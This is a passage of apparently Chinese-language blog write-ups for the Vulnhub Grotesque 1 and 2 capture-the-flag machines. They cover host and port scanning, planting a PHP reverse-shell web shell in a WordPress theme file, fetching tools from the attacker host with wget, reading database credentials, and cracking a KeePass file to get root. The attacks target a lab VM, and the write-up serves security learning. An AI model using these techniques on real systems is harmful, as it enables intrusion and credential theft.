-<p><img src="/2022/06/13/Grotesque-2/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，angel获取pspy64s工具</span><br><span class="line">chmod +x pspy64s，给予执行权力</span><br><span class="line">./pspy64s，开启进程监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/18.png" alt="image-"></p>
-<p>2.删去quiet目录下所有文件，让定时任务执行后，进一步查看，发现rootcreds.txt，可以获得root的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *，删除后根据进程定时大概要等待一段时间再查看</span><br><span class="line">ls -la /</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/20.png" alt="image-"></p>
-<p>3.登录root用户，在&#x2F;root目录下发现第二个flag，root.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/21.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-1/">
-                Grotesque 1
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque101">Grotesque:1.0.1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque101">名称：Grotesque:1.0.1</span></h4><h4><span id="发布日期2021310">发布日期：2021.3.10</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>raphael:&#x2F;<del>&#x2F;user.txt<br>root:&#x2F;</del>&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque_vh-101ova">文件名：grotesque_vh-1.0.1.ova</span></h4><h4><span id="文件大小672mb">文件大小：672MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque_vh-101ova">下载地址：</span></h4><h4><span id="md5-7e73878bdb1251d1dadc4cc49f5bad68">MD5: 7E73878BDB1251D1DADC4CC49F5BAD68</span></h4><h4><span id="sha1-778cf0a9721e530587c78dd198039297c7bb16ab">SHA1: 778CF0A9721E530587C78DD198039297C7BB16AB</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了66和80端口，而主页并没有东西：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.108 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现只有&#x2F;javascript，也无法直接查看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.108/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="端口指向发现">端口指向发现</span></h3><blockquote>
-<p>1.访问一下192.168.56.108:66页面，vvmlist.github.io，页面提示我们去下载这个项目，而在源码我们发现了一组很像brainfuck编码的注释：</p>
-<p><img src="/2022/06/13/Grotesque-1/7.png" alt="image-"></p>
-<p>2.brainfuck解码出来指向&#x2F;sshpasswd.png，同时我们下载下vvmlist这个项目，解压后很快就能发现这张图片：</p>
-<p><img src="/2022/06/13/Grotesque-1/8.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/9.png" alt="image-"></p>
-<p>3.利用多种工具分析sshpasswd.png没有分析出来，但靶机也没有开放22端口无法ssh登录，所以转向查看vvmlist中的其他文件，按照操作时间，我们可以发现80端口真正的指向，而且很可能是使用wordpress搭建的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat _vvmlist/* | sort | uniq</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台登录">Wordpress后台登录</span></h3><blockquote>
-<p>1.访问192.168.56.108&#x2F;lyricsblog，查看源码，我们会发现一张图片地址，查看图片，没有太多线索：</p>
-<p><img src="/2022/06/13/Grotesque-1/12.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/13.png" alt="image-"></p>
-<p>2.前面提到了这个页面是wordpress搭建的，我们使用wpscan扫描一下，也没有太多发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://grotesqueip/lyricsblog -e ap,cb,dbe,u1-999 --plugins-detection aggressive --plugins-version-detection aggressive</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/14.png" alt="image-"></p>
-<p>3.说句实话，思路到这里就断掉了，后来通过维基，发现&#x2F;lyricsblog页都是歌曲的歌词，然后yesman.png又提示他喜欢听hakan-tasiyan-doktor，我们尝试把这首歌的歌词全部获取下来md5然后大写一下，发现就是可以登录wordpress后台的密码，用户名是erdalkomurcu，页面有显示：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim doctor-lyrics.txt，写入歌词</span><br><span class="line">md5sum doctor-lyrics.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/15.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/16.png" alt="image-"></p>
-<p>4.访问192.168.56.108&#x2F;lyricsblog&#x2F;wp-admin，提示密码要大写，我们登录看看：</p>
-<p><img src="/2022/06/13/Grotesque-1/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="wordpress后台写入webshell准备提权">Wordpress后台写入webshell，准备提权</span></h3><blockquote>
-<p>1.在wordpress后台Appearance页Theme Editor，在404.php（my favorite）内粘贴kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php，并在kali开启对应端口监听，通过访问<br><a target="_blank" rel="noopener" href="http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1%E8%A7%A6%E5%8F%91webshell%EF%BC%9A">http://192.168.56.108/lyricsblog/index.php/author/erdalkomurcu/1触发webshell：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/20.png" alt="image-"></p>
-<p>2.通过查看&#x2F;var&#x2F;www&#x2F;html&#x2F;lyricsblog&#x2F;wp-config.php，能够得到raphael用户及密码，登录一下试试：</p>
-<p><img src="/2022/06/13/Grotesque-1/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/22.png" alt="image-"></p>
-<p>3.用python建立一个交互式shell，可以发现user.txt是一串类似md5值，但是解不出来；在发现有一个.kdbx文件，应该是root的密钥库文件，获取到kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/23.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/24.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/25.png" alt="image-"></p>
-<p>4.对.chadroot.kdbx使用keepass2john进行解密，这里要用到rockyou.txt，下载地址为<a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt%EF%BC%9A">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt：</a></p>
-<p><img src="/2022/06/13/Grotesque-1/26.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-1/27.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.获取到密码，利用app.keeweb.info，上传chadroot.kdbx，可以获得root密码:</p>
-<p><img src="/2022/06/13/Grotesque-1/28.png" alt="image-"></p>
-<p>2.在&#x2F;root页下获得flag，即root.txt:</p>
-<p><img src="/2022/06/13/Grotesque-1/29.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
             </div>
         
 
